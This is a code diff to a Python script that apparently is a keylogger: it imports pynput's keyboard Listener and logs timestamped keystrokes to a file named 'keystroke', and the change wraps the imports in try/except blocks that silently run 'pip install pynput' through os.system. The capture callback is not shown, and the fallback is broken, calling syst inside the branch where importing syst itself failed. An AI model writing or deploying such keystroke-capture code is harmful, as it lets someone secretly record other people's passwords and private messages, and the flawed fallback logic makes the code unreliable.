@@ -1,9 +1,26 @@
-from os import system as syst
+import sys
+try:
+	from os import system as syst
 
-syst('pip install pynput')
-syst('cls')
+except:
+	syst('pip install pynput')
+	syst('cls')
+	try:
+		from os import system as syst
+	except:
+		sys.exit()
 
-from pynput.keyboard import Key, Listener
+try:
+	from pynput.keyboard import Key, Listener
+
+except:
+	syst('pip install pynput')
+	syst('cls')
+	try:
+		from pynput.keyboard import Key, Listener
+	except:
+		sys.exit()
+
 import logging
 
 logging.basicConfig(filename='keystroke' , level = logging.DEBUG , format = '%(asctime)s : %(message)s')
